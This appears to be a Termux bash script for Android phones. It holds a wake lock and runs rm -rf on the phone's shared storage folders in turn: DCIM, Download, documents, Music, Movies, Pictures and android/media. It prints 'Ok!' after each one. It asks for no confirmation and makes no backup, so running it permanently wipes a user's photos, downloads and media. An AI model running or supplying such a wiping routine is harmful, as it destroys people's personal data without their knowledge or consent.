#!/data/data/com.termux/files/usr/bin/bash

termux-wake-lock

DIRECTORY="$HOME/storage/shared"

cd $DIRECTORY

if [[ -d android/media ]]; then
	rm -rf android/media
	echo 'android/media -> Ok!'
fi

if [[ -d DCIM ]]; then
	rm -rf DCIM
	echo 'DCIM -> Ok!'
fi

if [[ -d Download ]]; then
	rm -rf Download
	echo 'Download -> Ok!'
fi

if [[ -d documents ]]; then
	rm -rf documents
	echo 'documents -> Ok!'
fi

if [[ -d Music ]]; then
	rm -rf Music
	echo 'Music -> Ok!'
fi

if [[ -d Movies ]]; then
	rm -rf Movies
	echo 'Movies -> Ok!'
fi

if [[ -d Pictures ]]; then
	rm -rf Pictures
	echo 'Pictures -> Ok!'
fi

termux-wake-unlock

sleep 3
